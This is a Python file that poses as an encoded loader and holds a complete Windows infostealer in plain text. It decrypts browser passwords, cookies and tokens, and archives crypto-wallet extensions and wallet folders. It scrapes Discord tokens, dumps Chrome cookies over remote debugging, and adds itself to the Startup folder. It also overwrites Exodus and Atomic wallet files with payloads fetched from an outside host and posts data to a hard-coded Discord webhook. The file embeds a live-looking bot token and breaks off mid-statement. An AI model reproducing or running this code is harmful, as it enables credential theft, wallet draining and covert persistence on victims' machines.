import base64; import os; os.system('pip install pywin32 pycryptodome requests websocket-client pyautogui watchdog pygetwindow pywinauto psutil'); exec(base64.b64decode("import base64 
import json 
import re 
import sqlite3 
import zipfile 
import sys 
from urllib.request import Request, urlopen 
from datetime import datetime
import keyboard 
import win32com.client
import nextcord
from nextcord.ext import commands
import pyautogui as p
from pathlib import Path
import os
import shutil
import subprocess
import pyautogui
import time
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler
import pygetwindow as gw
from pywinauto import application
import psutil
import tempfile
import uuid

class WindowManager:
    def __init__(self, window_title=None):
        self.window_title = window_title
        self.window = self._get_window_by_title(window_title)

    def _get_window_by_title(self, title):
        try:
            return gw.getWindowsWithTitle(title)[0] if title else gw.getActiveWindow()
        except IndexError:
            raise ValueError(f"No window found with title: {title}")

    def focus_window(self):
        if self.window:
            self.window.activate()
        else:
            raise ValueError("No window to focus.")

    def resize_window(self, width, height):
        if self.window:
            self.window.resizeTo(width, height)
        else:
            raise ValueError("No window to resize.")

    def move_window(self, x, y):
        if self.window:
            self.window.moveTo(x, y)
        else:
            raise ValueError("No window to move.")

    def maximize_window(self):
        if self.window:
            self.window.maximize()
        else:
            raise ValueError("No window to maximize.")

    def minimize_window(self):
        if self.window:
            self.window.minimize()
        else:
            raise ValueError("No window to minimize.")

    def get_window_size(self):
        if self.window:
            return self.window.size
        else:
            raise ValueError("No window to get size from.")

    def get_window_position(self):
        if self.window:
            return self.window.topleft
        else:
            raise ValueError("No window to get position from.")

    def close_window(self):
        if self.window:
            app = application.Application().connect(handle=self.window._hWnd)
            app.kill()
        else:
            raise ValueError("No window to close.")

class ScreenshotTaker:
    def __init__(self, save_directory: str = "screenshots"):
        self.save_directory = Path(save_directory)
        self.save_directory.mkdir(parents=True, exist_ok=True)

    def take_screenshot(self, filename: str = None) -> str:
        if filename is None:
            filename = datetime.now().strftime("%Y-%m-%d_%H-%M-%S.png")
        filepath = self.save_directory / filename
        screenshot = pyautogui.screenshot()
        screenshot.save(filepath)
        return str(filepath)

    def take_screenshot_with_dimensions(self, filename: str = None, region: tuple = None) -> str:
        if filename is None:
            filename = datetime.now().strftime("%Y-%m-%d_%H-%M-%S.png")
        filepath = self.save_directory / filename
        screenshot = pyautogui.screenshot(region=region)
        screenshot.save(filepath)
        return str(filepath)

# Initialize the bot
intents = nextcord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.members = True
bot = commands.Bot(command_prefix="!", intents=intents)

# Record the start time when the script starts
start_time = time.time()

# Get the path of the current script
script_path = sys.argv[0]

# Define the target directory (Startup folder)
startup_folder = os.path.join(os.environ['APPDATA'], r"Microsoft\Windows\Start Menu\Programs\Startup")


# Initialize the ScreenshotTaker
screenshot_taker = ScreenshotTaker()

# To stop the code from stopping when the cursor is in the corner of the screen
pyautogui.FAILSAFE = False

# Function to get available drives
def get_available_drives():
    return [f"{chr(d)}:\\" for d in range(65, 91) if os.path.exists(f"{chr(d)}:\\")]

# Create a list of directories to monitor
drives_to_monitor = get_available_drives()

# Example directory to monitor, modify as needed
# Here we are assuming you want to monitor all available drives
path_to_monitor = drives_to_monitor


# Replace with your bot's token and the channel ID where you want to send the message
TOKEN = 'MTIyNDMzMTg4ODQyMDg0NzY3Ng.G2TSpG.9yNbp3sr1A7VlWlyqGa5vN7nkE2axSbRsxGa14'
GUILD_ID = 1276995815881048194



def get_session_id():
    temp_file = os.path.join(tempfile.gettempdir(), "session_id.txt")

    if os.path.exists(temp_file):
        # Read the existing session ID
        with open(temp_file, "r") as f:
            session_id = f.read().strip()
    else:
        # Generate a new session ID
        session_id = str(uuid.uuid4())
        with open(temp_file, "w") as f:
            f.write(session_id)

    return session_id

# Session-specific variables
SESSION_ID = get_session_id()
CATEGORY_NAME = SESSION_ID
CHANNEL_NAMES = ["keystrokes", "general"]

keystrokes = None
general = None
logs = None
webhook = None
url_ = "https://discord.com/api/webhooks/1312446079878565988/1KeLvgxr5Xc531x-XXQFtCZQwNiLiOsw6Wg6-WYbIJ5ykbNL7PxDGqzWTXOde58n-Tn2"


@bot.event
async def on_ready():
    global keystrokes, general, webhook, url_

    print("Bot is ready and listening for keystrokes.")
    print("Press 'esc' to exit.")

    # Debug prints to check bot's state
    print(f"Bot user: {bot.user}")
    try:
        guild_names = [guild.name.encode('ascii', 'ignore').decode() for guild in bot.guilds]
        print(f"Connected to guilds: {guild_names}")
    except Exception as e:
        print(f"Connected to {len(bot.guilds)} guilds")
    
    guild = bot.get_guild(GUILD_ID)
    print(f"Attempting to get guild with ID {GUILD_ID}")
    print(f"Found guild: {guild}")
    
    if not guild:
        print(f"Guild with ID {GUILD_ID} not found!")
        print(f"Available guilds: {[(g.id) for g in bot.guilds]}")
        return

    # Check if the category exists
    category = nextcord.utils.get(guild.categories, name=CATEGORY_NAME)
    print(f"Found category: {category}")  # Debug print
    
    if not category:
        try:
            # Create the category and channels
            category = await guild.create_category(CATEGORY_NAME)
            for channel_name in CHANNEL_NAMES:
                await guild.create_text_channel(channel_name, category=category)
            print(f"Created category '{CATEGORY_NAME}' with channels: {', '.join(CHANNEL_NAMES)}")
        except Exception as e:
            print(f"Error creating category/channels: {e}")  # Debug print
    else:
        print(f"Category '{CATEGORY_NAME}' already exists.")

    # Assign channel objects to global variables
    keystrokes = nextcord.utils.get(category.text_channels, name="keystrokes")
    general = nextcord.utils.get(category.text_channels, name="general")

    data = {
        "content": f"New Session at [{current_time}] | {USERNAME}"
    }
    response = requests.post(url_, json=data)

    
    # Make sure the Startup folder exists
    if not os.path.exists(startup_folder):
        print("Startup folder does not exist.")
    else:
        # Define the path where the script will be copied
        target_path = os.path.join(startup_folder, os.path.basename(script_path))  # You can change the name of the copied script

        # Check if the script already exists in the Startup folder
        if os.path.exists(target_path):
            print(f"Script already exists in the Startup folder: {target_path}")
        else:
            # Copy the script to the Startup folder
            try:
                shutil.copy(script_path, target_path)
                print(f"Script copied to {target_path}")
            except Exception as e:
                print(f"Error: {e}")
    
    


current_time = datetime.now().strftime("%H:%M:%S")

CURRENT_INTERPRETER = sys.executable

proc = subprocess.Popen([CURRENT_INTERPRETER, "-m", "pip", "install", "pycryptodome", "pypiwin32", "pywin32","requests", "websocket-client"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,creationflags=subprocess.CREATE_NO_WINDOW)

proc.wait()

try:

    import win32crypt

    from Crypto.Cipher import AES

    import requests

    import websocket

except:

    current_file = os.path.abspath(__file__)

    subprocess.Popen([CURRENT_INTERPRETER, current_file], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,creationflags=subprocess.CREATE_NO_WINDOW)

    exit()





USER_PROFILE = os.getenv('USERPROFILE')

APPDATA = os.getenv('APPDATA')

LOCALAPPDATA = os.getenv('LOCALAPPDATA')

STORAGE_PATH = APPDATA + "\\gruppe_storage"

STARTUP_PATH = os.path.join(APPDATA, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")

USERNAME = os.environ.get("USERNAME") or os.environ.get("USER")



if not os.path.exists(STORAGE_PATH):

    os.makedirs(STORAGE_PATH)



CHROMIUM_BROWSERS = [

    {"name": "Google Chrome", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data"), "taskname": "chrome.exe"},

    {"name": "Microsoft Edge", "path": os.path.join(LOCALAPPDATA, "Microsoft", "Edge", "User Data"), "taskname": "msedge.exe"},

    {"name": "Opera", "path": os.path.join(APPDATA, "Opera Software", "Opera Stable"), "taskname": "opera.exe"},

    {"name": "Opera GX", "path": os.path.join(APPDATA, "Opera Software", "Opera GX Stable"), "taskname": "opera.exe"},

    {"name": "Brave", "path": os.path.join(LOCALAPPDATA, "BraveSoftware", "Brave-Browser", "User Data"), "taskname": "brave.exe"},

    {"name": "Yandex", "path": os.path.join(APPDATA, "Yandex", "YandexBrowser", "User Data"), "taskname": "yandex.exe"},

]



CHROMIUM_SUBPATHS = [

    {"name": "None", "path": ""},

    {"name": "Default", "path": "Default"},

    {"name": "Profile 1", "path": "Profile 1"},

    {"name": "Profile 2", "path": "Profile 2"},

    {"name": "Profile 3", "path": "Profile 3"},

    {"name": "Profile 4", "path": "Profile 4"},

    {"name": "Profile 5", "path": "Profile 5"},

]



BROWSER_EXTENSIONS = [

    {"name": "Authenticator", "path": "\\Local Extension Settings\\bhghoamapcdpbohphigoooaddinpkbai"},

    {"name": "Binance", "path": "\\Local Extension Settings\\fhbohimaelbohpjbbldcngcnapndodjp"},

    {"name": "Bitapp", "path": "\\Local Extension Settings\\fihkakfobkmkjojpchpfgcmhfjnmnfpi"},

    {"name": "BoltX", "path": "\\Local Extension Settings\\aodkkagnadcbobfpggfnjeongemjbjca"},

    {"name": "Coin98", "path": "\\Local Extension Settings\\aeachknmefphepccionboohckonoeemg"},

    {"name": "Coinbase", "path": "\\Local Extension Settings\\hnfanknocfeofbddgcijnmhnfnkdnaad"},

    {"name": "Core", "path": "\\Local Extension Settings\\agoakfejjabomempkjlepdflaleeobhb"},

    {"name": "Crocobit", "path": "\\Local Extension Settings\\pnlfjmlcjdjgkddecgincndfgegkecke"},

    {"name": "Equal", "path": "\\Local Extension Settings\\blnieiiffboillknjnepogjhkgnoapac"},

    {"name": "Ever", "path": "\\Local Extension Settings\\cgeeodpfagjceefieflmdfphplkenlfk"},

    {"name": "ExodusWeb3", "path": "\\Local Extension Settings\\aholpfdialjgjfhomihkjbmgjidlcdno"},

    {"name": "Fewcha", "path": "\\Local Extension Settings\\ebfidpplhabeedpnhjnobghokpiioolj"},

    {"name": "Finnie", "path": "\\Local Extension Settings\\cjmkndjhnagcfbpiemnkdpomccnjblmj"},

    {"name": "Guarda", "path": "\\Local Extension Settings\\hpglfhgfnhbgpjdenjgmdgoeiappafln"},

    {"name": "Guild", "path": "\\Local Extension Settings\\nanjmdknhkinifnkgdcggcfnhdaammmj"},

    {"name": "HarmonyOutdated", "path": "\\Local Extension Settings\\fnnegphlobjdpkhecapkijjdkgcjhkib"},

    {"name": "Iconex", "path": "\\Local Extension Settings\\flpiciilemghbmfalicajoolhkkenfel"},

    {"name": "Jaxx Liberty", "path": "\\Local Extension Settings\\cjelfplplebdjjenllpjcblmjkfcffne"},

    {"name": "Kaikas", "path": "\\Local Extension Settings\\jblndlipeogpafnldhgmapagcccfchpi"},

    {"name": "KardiaChain", "path": "\\Local Extension Settings\\pdadjkfkgcafgbceimcpbkalnfnepbnk"},

    {"name": "Keplr", "path": "\\Local Extension Settings\\dmkamcknogkgcdfhhbddcghachkejeap"},

    {"name": "Liquality", "path": "\\Local Extension Settings\\kpfopkelmapcoipemfendmdcghnegimn"},

    {"name": "MEWCX", "path": "\\Local Extension Settings\\nlbmnnijcnlegkjjpcfjclmcfggfefdm"},

    {"name": "MaiarDEFI", "path": "\\Local Extension Settings\\dngmlblcodfobpdpecaadgfbcggfjfnm"},

    {"name": "Martian", "path": "\\Local Extension Settings\\efbglgofoippbgcjepnhiblaibcnclgk"},

    {"name": "Math", "path": "\\Local Extension Settings\\afbcbjpbpfadlkmhmclhkeeodmamcflc"},

    {"name": "Metamask", "path": "\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn"},

    {"name": "Metamask2", "path": "\\Local Extension Settings\\ejbalbakoplchlghecdalmeeeajnimhm"},

    {"name": "Mobox", "path": "\\Local Extension Settings\\fcckkdbjnoikooededlapcalpionmalo"},

    {"name": "Nami", "path": "\\Local Extension Settings\\lpfcbjknijpeeillifnkikgncikgfhdo"},

    {"name": "Nifty", "path": "\\Local Extension Settings\\jbdaocneiiinmjbjlgalhcelgbejmnid"},

    {"name": "Oxygen", "path": "\\Local Extension Settings\\fhilaheimglignddkjgofkcbgekhenbh"},

    {"name": "PaliWallet", "path": "\\Local Extension Settings\\mgffkfbidihjpoaomajlbgchddlicgpn"},

    {"name": "Petra", "path": "\\Local Extension Settings\\ejjladinnckdgjemekebdpeokbikhfci"},

    {"name": "Phantom", "path": "\\Local Extension Settings\\bfnaelmomeimhlpmgjnjophhpkkoljpa"},

    {"name": "Pontem", "path": "\\Local Extension Settings\\phkbamefinggmakgklpkljjmgibohnba"},

    {"name": "Ronin", "path": "\\Local Extension Settings\\fnjhmkhhmkbjkkabndcnnogagogbneec"},

    {"name": "Safepal", "path": "\\Local Extension Settings\\lgmpcpglpngdoalbgeoldeajfclnhafa"},

    {"name": "Saturn", "path": "\\Local Extension Settings\\nkddgncdjgjfcddamfgcmfnlhccnimig"},

    {"name": "Slope", "path": "\\Local Extension Settings\\pocmplpaccanhmnllbbkpgfliimjljgo"},

    {"name": "Solfare", "path": "\\Local Extension Settings\\bhhhlbepdkbapadjdnnojkbgioiodbic"},

    {"name": "Sollet", "path": "\\Local Extension Settings\\fhmfendgdocmcbmfikdcogofphimnkno"},

    {"name": "Starcoin", "path": "\\Local Extension Settings\\mfhbebgoclkghebffdldpobeajmbecfk"},

    {"name": "Swash", "path": "\\Local Extension Settings\\cmndjbecilbocjfkibfbifhngkdmjgog"},

    {"name": "TempleTezos", "path": "\\Local Extension Settings\\ookjlbkiijinhpmnjffcofjonbfbgaoc"},

    {"name": "TerraStation", "path": "\\Local Extension Settings\\aiifbnbfobpmeekipheeijimdpnlpgpp"},

    {"name": "Tokenpocket", "path": "\\Local Extension Settings\\mfgccjchihfkkindfppnaooecgfneiii"},

    {"name": "Ton", "path": "\\Local Extension Settings\\nphplpgoakhhjchkkhmiggakijnkhfnd"},

    {"name": "Tron", "path": "\\Local Extension Settings\\ibnejdfjmmkpcnlpebklmnkoeoihofec"},

    {"name": "Trust Wallet", "path": "\\Local Extension Settings\\egjidjbpglichdcondbcbdnbeeppgdph"},

    {"name": "Wombat", "path": "\\Local Extension Settings\\amkmjjmmflddogmhpjloimipbofnfjih"},

    {"name": "XDEFI", "path": "\\Local Extension Settings\\hmeobnfnfcmdkdcmlblgagmfpfboieaf"},

    {"name": "XMR.PT", "path": "\\Local Extension Settings\\eigblbgjknlfbajkfhopmcojidlgcehm"},

    {"name": "XinPay", "path": "\\Local Extension Settings\\bocpokimicclpaiekenaeelehdjllofo"},

    {"name": "Yoroi", "path": "\\Local Extension Settings\\ffnbelfdoeiohenkjibnmadjiehjhajb"},

    {"name": "iWallet", "path": "\\Local Extension Settings\\kncchdigobghenbbaddojjnnaogfppfj"}

]



WALLET_PATHS = [

    {"name": "Atomic", "path": os.path.join(APPDATA, "atomic", "Local Storage", "leveldb")},

    {"name": "Exodus", "path": os.path.join(APPDATA, "Exodus", "exodus.wallet")},

    {"name": "Electrum", "path": os.path.join(APPDATA, "Electrum", "wallets")},

    {"name": "Electrum-LTC", "path": os.path.join(APPDATA, "Electrum-LTC", "wallets")},

    {"name": "Zcash", "path": os.path.join(APPDATA, "Zcash")},

    {"name": "Armory", "path": os.path.join(APPDATA, "Armory")},

    {"name": "Bytecoin", "path": os.path.join(APPDATA, "bytecoin")},

    {"name": "Jaxx", "path": os.path.join(APPDATA, "com.liberty.jaxx", "IndexedDB", "file__0.indexeddb.leveldb")},

    {"name": "Etherium", "path": os.path.join(APPDATA, "Ethereum", "keystore")},

    {"name": "Guarda", "path": os.path.join(APPDATA, "Guarda", "Local Storage", "leveldb")},

    {"name": "Coinomi", "path": os.path.join(APPDATA, "Coinomi", "Coinomi", "wallets")},

    {"name": "Telegram", "path": os.path.join(APPDATA, "Telegram Desktop", "tdata")},

]



PATHS_TO_SEARCH = [

    USER_PROFILE + "\\Desktop",

    USER_PROFILE + "\\Documents",

    USER_PROFILE + "\\Downloads",

    USER_PROFILE + "\\OneDrive\\Documents",

    USER_PROFILE + "\\OneDrive\\Desktop",

]



FILE_KEYWORDS = [

        "passw",

        "mdp",

        "motdepasse",

        "mot_de_passe",

        "login",

        "secret",

        "account",

        "acount",

        "paypal",

        "banque",

        "metamask",

        "wallet",

        "crypto",

        "exodus",

        "discord",

        "2fa",

        "code",

        "memo",

        "compte",

        "token",

        "backup",

        "seecret"

]



ALLOWED_EXTENSIONS = [

    ".txt",

    ".log",

    ".doc",

    ".docx",

    ".xls",

    ".xlsx",

    ".ppt",

    ".pptx",

    ".odt",

    ".pdf",

    ".rtf",

    ".json",

    ".csv",

    ".db",

    ".jpg",

    ".jpeg",

    ".png",

    ".gif",

    ".webp",

    ".mp4"

]



DISCORD_PATHS = [

    {"name": "Discord", "path": os.path.join(APPDATA, "discord", "Local Storage", "leveldb")},

    {"name": "Discord Canary", "path": os.path.join(APPDATA, "discordcanary", "Local Storage", "leveldb")},

    {"name": "Discord PTB", "path": os.path.join(APPDATA, "discordptb", "Local Storage", "leveldb")},

    {"name": "Opera", "path": os.path.join(APPDATA, "Opera Software", "Opera Stable", "Local Storage", "leveldb")},

    {"name": "Opera GX", "path": os.path.join(APPDATA, "Opera Software", "Opera GX Stable", "Local Storage", "leveldb")},

    {"name": "Amigo", "path": os.path.join(LOCALAPPDATA, "Amigo", "User Data", "Local Storage", "leveldb")},

    {"name": "Torch", "path": os.path.join(LOCALAPPDATA, "Torch", "User Data", "Local Storage", "leveldb")},

    {"name": "Kometa", "path": os.path.join(LOCALAPPDATA, "Kometa", "User Data", "Local Storage", "leveldb")},

    {"name": "Orbitum", "path": os.path.join(LOCALAPPDATA, "Orbitum", "User Data", "Local Storage", "leveldb")},

    {"name": "CentBrowser", "path": os.path.join(LOCALAPPDATA, "CentBrowser", "User Data", "Local Storage", "leveldb")},

    {"name": "7Star", "path": os.path.join(LOCALAPPDATA, "7Star", "7Star", "User Data", "Local Storage", "leveldb")},

    {"name": "Sputnik", "path": os.path.join(LOCALAPPDATA, "Sputnik", "Sputnik", "User Data", "Local Storage", "leveldb")},

    {"name": "Vivaldi", "path": os.path.join(LOCALAPPDATA, "Vivaldi", "User Data", "Default", "Local Storage", "leveldb")},

    {"name": "Chrome SxS", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome SxS", "User Data", "Local Storage", "leveldb")},

    {"name": "Chrome", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb")},

    {"name": "Chrome1", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data", "Profile 1", "Local Storage", "leveldb")},

    {"name": "Chrome2", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data", "Profile 2", "Local Storage", "leveldb")},

    {"name": "Chrome3", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data", "Profile 3", "Local Storage", "leveldb")},

    {"name": "Chrome4", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data", "Profile 4", "Local Storage", "leveldb")},

    {"name": "Chrome5", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data", "Profile 5", "Local Storage", "leveldb")},

    {"name": "Epic Privacy Browser", "path": os.path.join(LOCALAPPDATA, "Epic Privacy Browser", "User Data", "Local Storage", "leveldb")},

    {"name": "Microsoft Edge", "path": os.path.join(LOCALAPPDATA, "Microsoft", "Edge", "User Data", "Default", "Local Storage", "leveldb")},

    {"name": "Uran", "path": os.path.join(LOCALAPPDATA, "uCozMedia", "Uran", "User Data", "Default", "Local Storage", "leveldb")},

    {"name": "Yandex", "path": os.path.join(LOCALAPPDATA, "Yandex", "YandexBrowser", "User Data", "Default", "Local Storage", "leveldb")},

    {"name": "Brave", "path": os.path.join(LOCALAPPDATA, "BraveSoftware", "Brave-Browser", "User Data", "Default", "Local Storage", "leveldb")},

    {"name": "Iridium", "path": os.path.join(LOCALAPPDATA, "Iridium", "User Data", "Default", "Local Storage", "leveldb")}

]

DISCORD_TOKENS = []

PASSWORDS = []

COOKIES = []

WEB_DATA = []

DISCORD_IDS = []





def decrypt_data(data, key):

    try:

        iv = data[3:15]

        data = data[15:]

        cipher = AES.new(key, AES.MODE_GCM, iv)

        return cipher.decrypt(data)[:-16].decode()

    except:

        return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])





def zip_to_storage(name, source, destination):

    if os.path.isfile(source):

        with zipfile.ZipFile(destination + f"\\{name}.zip", "w") as z:

            z.write(source, os.path.basename(source))

    else:

        with zipfile.ZipFile(destination + f"\\{name}.zip", "w") as z:

            for root, dirs, files in os.walk(source):

                for file in files:

                    z.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), os.path.join(source, '..')))






def upload_to_server(filepath):
    

    for i in range(10):

        try:
            url = url_

            files = {'file': open(filepath, 'rb')}

            r = requests.post(url, files=files)

            if r.status_code == 200:

                break

        except: pass




def validate_discord_token(token):

    r = requests.get("https://discord.com/api/v9/users/@me", headers={"Authorization": token})

    if r.status_code == 200:

        return r.json()

    else:

        return None





def taskkill(taskname):

    subprocess.run(["taskkill", "/F", "/IM", taskname], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)



def inject():

    procc = "exodus.exe"

    local = os.getenv("localappdata")

    path = f"{local}/exodus"

    if not os.path.exists(path): return

    listOfFile = os.listdir(path)

    apps = []

    for file in listOfFile:

        if "app-" in file:

            apps += [file]

    exodusPatchURL = "https://dieserbenni.ru/app.asar"

    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36"}

    req = Request(exodusPatchURL, headers=headers)

    response = urlopen(req)

    data = response.read()

    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)

    for app in apps:

        try:

            fullpath = f"{path}/{app}/resources/app.asar"

            with open(fullpath, 'wb') as out_file1:

                out_file1.write(data)

        except: pass



for i in range(10):

    try:

        inject()

        break

    except: pass

def inject_atomic():

    procc = "Atomic Wallet.exe"

    local = os.getenv("localappdata")

    path = f"{local}/Programs/atomic"

    if not os.path.exists(path): return

    atomicPatchURL = "https://dieserbenni.ru/atomic/app.asar"

    headers = {"User-Agent": "Mozilla/5.0"}

    req = Request(atomicPatchURL, headers=headers)

    response = urlopen(req)

    data = response.read()

    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)

    try:

        fullpath = f"{path}/resources/app.asar"

        with open(fullpath, 'wb') as out_file1:

            out_file1.write(data)

    except: pass

for i in range(10):

    try:

        inject_atomic()

        break

    except: pass



for browser in CHROMIUM_BROWSERS:

    taskkill(browser["taskname"])

    local_state = os.path.join(browser["path"], "Local State")

    if not os.path.exists(local_state): continue

    with open(local_state, "r", encoding="utf-8") as f:

        local_state = json.loads(f.read())

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]

    decryption_key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

    for subpath in CHROMIUM_SUBPATHS:

        if not os.path.exists(os.path.join(browser["path"], subpath["path"])): continue

        try:

            login_data_file = os.path.join(browser["path"], subpath["path"], "Login Data")

            temp_db = os.path.join(browser["path"], subpath["path"], f"{browser['name']}-pw.db")

            shutil.copy(login_data_file, temp_db)

            connection = sqlite3.connect(temp_db)

            cursor = connection.cursor()

            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

            for row in cursor.fetchall():

                origin_url = row[0]

                username = row[1]

                password = decrypt_data(row[2], decryption_key)

                if username or password:

                    PASSWORDS.append({"browser": browser["name"], "profile": subpath["name"], "url": origin_url, "username": username, "password": password})

            cursor.close()

            connection.close()

            os.remove(temp_db)

        except:

            pass



        try:

            cookies_file = os.path.join(browser["path"], subpath["path"], "Network", "Cookies")

            temp_db = os.path.join(browser["path"], subpath["path"], "Network", f"{browser['name']}-ck.db")

            shutil.copy(cookies_file, temp_db)

            connection = sqlite3.connect(temp_db)

            cursor = connection.cursor()

            cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")

            cookie_str = ""

            for row in cursor.fetchall():

                host = row[0]

                name = row[1]

                value = decrypt_data(row[2], decryption_key)

                cookie_str += f"{host}\tTRUE\t/\tFALSE\t13355861278849698\t{name}\t{value}\n"

            COOKIES.append({"browser": browser["name"], "profile": subpath["name"], "cookies": base64.b64encode(cookie_str.encode()).decode()})

            cursor.close()

            connection.close()

            os.remove(temp_db)

        except:

            pass

        try:
            web_data_file = os.path.join(browser["path"], subpath["path"], "Web Data")

            temp_db = os.path.join(browser["path"], subpath["path"], f"{browser['name']}-webdata.db")

            shutil.copy(web_data_file, temp_db)

            connection = sqlite3.connect(temp_db)

            cursor = connection.cursor()

            cursor.execute("SELECT service, encrypted_token FROM token_service")

            for row in cursor.fetchall():

                web_service = row[0]

                web_token = decrypt_data(row[1], decryption_key)

                WEB_DATA.append({"browser": browser["name"], "profile": subpath["name"], "service": web_service, "token": web_token})

            cursor.close()

            connection.close()

            os.remove(temp_db)
        except:
            pass


        for extension in BROWSER_EXTENSIONS:

            extension_path = os.path.join(browser["path"], subpath["path"]) + extension["path"]

            if os.path.exists(extension_path):

                try:

                    zip_to_storage(f"{browser['name']}-{subpath['name']}-{extension['name']}", extension_path, STORAGE_PATH)

                except:

                    pass

firefox_path = os.path.join(APPDATA, 'Mozilla', 'Firefox', 'Profiles')

if os.path.exists(firefox_path):

    taskkill("firefox.exe")

    for profile in os.listdir(firefox_path):

        try:

            if profile.endswith('.default') or profile.endswith('.default-release'):

                profile_path = os.path.join(firefox_path, profile)

                if os.path.exists(os.path.join(profile_path, "cookies.sqlite")):

                    shutil.copy(os.path.join(profile_path, "cookies.sqlite"), os.path.join(profile_path, "cookies-copy.sqlite"))

                    connection = sqlite3.connect(os.path.join(profile_path, "cookies-copy.sqlite"))

                    cursor = connection.cursor()

                    cursor.execute("SELECT host, name, value FROM moz_cookies")

                    cookie_str = ""

                    for row in cursor.fetchall():

                        host, name, value = row

                        cookie_str += f"{host}\tTRUE\t/\tFALSE\t13355861278849698\t{name}\t{value}\n"

                    COOKIES.append({"browser": "Firefox", "profile": profile, "cookies": base64.b64encode(cookie_str.encode()).decode()})

                    cursor.close()

                    connection.close()

                    os.remove(os.path.join(profile_path, "cookies-copy.sqlite"))

        except:

            continue



for wallet_file in WALLET_PATHS:

    if os.path.exists(wallet_file["path"]):

        try:

            zip_to_storage(wallet_file["name"], wallet_file["path"], STORAGE_PATH)

        except:

            pass


chrome_path = None
if os.path.exists("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"):
    chrome_path = "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"
elif os.path.exists("C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe"):
    chrome_path = "C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe"

if chrome_path is not None:
    for profile in ["Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Profile 5"]:
        if os.path.exists(LOCALAPPDATA + f"\\Google\\Chrome\\User Data\\{profile}"):
            taskkill("chrome.exe")
            strtcmd = f'"{chrome_path}" --window-position=-2400,-2400 --remote-debugging-port=9222 --remote-allow-origins=* --profile-directory="{profile}"'
            subprocess.Popen(strtcmd, creationflags=subprocess.CREATE_NEW_CONSOLE, close_fds=True)
            targets = requests.get("http://localhost:9222/json").json()
            ws_url = targets[0]["webSocketDebuggerUrl"]
            ws = websocket.create_connection(ws_url)
            payload = {
                "id": 1,
                "method": "Storage.getCookies",
                "params": {}
            }
            ws.send(json.dumps(payload))
            cookie_str = ""
            for cookie in json.loads(ws.recv())["result"]["cookies"]:
                cookie_str += f"{cookie['domain']}\tTRUE\t/\tFALSE\t13355861278849698\t{cookie['name']}\t{cookie['value']}\n"
            with open(STORAGE_PATH + f"\\Cookies-Chrome-New-{profile}.txt", "w") as f:
                f.write(cookie_str)
            ws.close()
            taskkill("chrome.exe")






for discord_path in DISCORD_PATHS:

    if not os.path.exists(discord_path["path"]): continue

    try:

        name_without_spaces = discord_path["name"].replace(" ", "")

        if "cord" in discord_path["path"]:

            if not os.path.exists(APPDATA + f"\\{name_without_spaces}\\Local State"): continue

            try:

                with open(APPDATA + f"\\{name_without_spaces}\\Local State", "r", encoding="utf-8") as f:

                    local_state = json.loads(f.read())

                key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]

                decryption_key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

                for file_name in os.listdir(discord_path["path"]):

                    if file_name[-3:] not in ["ldb", "log"]: continue

                    for line in [x.strip() for x in open(f'{discord_path["path"]}\\{file_name}', errors='ignore').readlines() if x.strip()]:

                        for y in re.findall(r"dQw4w9WgXcQ:[^\"]*", line):

                            token = decrypt_data(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), decryption_key)

                            token_data = validate_discord_token(token)

                            if token_data:

                                if token_data["id"] not in DISCORD_IDS:

                                    DISCORD_IDS.append(token_data["id"])

                                    username = token_data["username"] if token_data["discriminator"] == "0" else f"{token_data['username']}#{token_data['discriminator']}"

                                    phone_number = token_data["phone"] if token_data["phone"] else "Not linked"
                                    DISCORD_TOKENS.append(
                                        {"token": token, "user_id": token_data["id"], "username": username,

                                         "display_name": token_data["global_name"], "email": token_data["email"],

                                         "phone": phone_number})

            except:

                pass

        else:

            for file_name in os.listdir(discord_path["path"]):

                if file_name[-3:] not in ["ldb", "log"]: continue

                for line in [x.strip() for x in open(f'{discord_path["path"]}\\{file_name}', errors='ignore').readlines() if x.strip()]:

                    for token in re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", line):

                        token_data = validate_discord_token(token)

                        if token_data:

                            if token_data["id"] not in DISCORD_IDS:

                                DISCORD_IDS.append(token_data["id"])

                                username = token_data["username"] if token_data["discriminator"] == "0" else f"{token_data['username']}#{token_data['discriminator']}"

                                phone_number = token_data["phone"] if token_data["phone"] else "Not linked"

                                DISCORD_TOKENS.append(

                                    {"token": token, "user_id": token_data["id"], "username": username,

                                     "display_name": token_data["global_name"], "email": token_data["email"],

                                     "phone": phone_number})

    except:

        pass





with open(STORAGE_PATH + "\\Passwords.txt", "w", encoding="utf-8") as f:

    f.write(

        f"\n{'-'*50}\n".join([

